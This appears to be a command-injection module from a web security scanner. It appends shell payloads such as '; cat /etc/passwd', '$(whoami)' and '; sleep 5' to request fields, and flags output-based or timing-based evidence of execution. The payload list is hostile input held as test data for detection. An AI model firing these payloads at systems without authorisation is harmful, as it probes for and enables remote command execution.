import asyncio
import time
from typing import Optional, Dict, List
from app.scanners.base import send_request, get_baseline, build_finding

CMD_PAYLOADS = [
    "; ls",
    "| ls",
    "& ls",
    "&& ls",
    "; whoami",
    "| whoami",
    "&& whoami",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "`whoami`",
    "$(whoami)",
    "; ping -c 5 127.0.0.1",   # time-based on Linux
    "| sleep 5",
    "; sleep 5",
    "& timeout 5",              # time-based on Windows
]

CMD_OUTPUT_INDICATORS = [
    "root:x:", "bin:x:", "daemon:x:",   # /etc/passwd
    "www-data", "nobody",                # common Linux users
    "uid=", "gid=",                      # whoami output
    "volume serial",                     # Windows dir
    "directory of",                      # Windows dir
    "total ",                            # Linux ls
    "drwx", "drwr",                      # ls output
]

TIME_PAYLOADS = ["| sleep 5", "; sleep 5", "& timeout 5"]
TIME_THRESHOLD = 4.5


def inject_into_params(params: Dict, payload: str) -> Dict:
    return {k: str(v) + payload for k, v in params.items()}


def inject_into_body(body: Dict, payload: str) -> Dict:
    return {k: str(v) + payload if isinstance(v, (str, int)) else v
            for k, v in body.items()}


async def run(
    url: str,
    method: str = "GET",
    headers: Optional[Dict] = None,
    body: Optional[Dict] = None
) -> List[Dict]:
    findings = []

    baseline = await get_baseline(method, url, headers=headers, body=body)
    if not baseline:
        return findings

    test_params = {"cmd": "ls", "exec": "ls", "command": "ls",
                   "input": "test", "query": "test", "file": "test.txt"}
    test_body = body if body else {"input": "test", "command": "ls", "file": "test.txt"}

    # -------------------------------------------------------
    # Test 1: Output-based command injection
    # -------------------------------------------------------
    for payload in CMD_PAYLOADS:
        injected_params = inject_into_params(test_params, payload)
        injected_body = inject_into_body(test_body, payload)

        resp = await send_request(
            method, url,
            headers=headers,
            params=injected_params,
            body=injected_body,
            timeout=10
        )

        if not resp:
            continue

        resp_text = resp.text
        matched = [ind for ind in CMD_OUTPUT_INDICATORS
                   if ind.lower() in resp_text.lower()]

        if matched:
            findings.append(build_finding(
                scanner="cmd_injection",
                severity="critical",
                title="Command Injection Vulnerability Detected",
                description=(
                    f"The payload `{payload}` caused command output to appear "
                    "in the API response. This means shell commands injected "
                    "via user input are being executed on the server."
                ),
                evidence={
                    "payload": payload,
                    "matched_output": matched,
                    "response_snippet": resp_text[:400]
                },
                endpoint=url
            ))
            return findings  # stop on confirmed finding

    # -------------------------------------------------------
    # Test 2: Time-based command injection
    # -------------------------------------------------------
    for payload in TIME_PAYLOADS:
        injected_params = inject_into_params(test_params, payload)
        injected_body = inject_into_body(test_body, payload)

        start = time.monotonic()
        resp = await send_request(
            method, url,
            headers=headers,
            params=injected_params,
            body=injected_body,
            timeout=15
        )
        elapsed = time.monotonic() - start

        if resp and elapsed >= TIME_THRESHOLD:
            findings.append(build_finding(
                scanner="cmd_injection",
                severity="critical",
                title="Time-Based Command Injection Detected",
                description=(
                    f"The payload `{payload}` caused the server to delay "
                    f"its response by {elapsed:.2f} seconds, indicating "
                    "the injected shell command was executed."
                ),
                evidence={
                    "payload": payload,
                    "response_time_seconds": round(elapsed, 2)
                },
                endpoint=url
            ))
            return findings

    if not findings:
        findings.append(build_finding(
            scanner="cmd_injection",
            severity="info",
            title="No Command Injection Detected",
            description="No command output or timing anomalies detected.",
            endpoint=url
        ))

    return findings
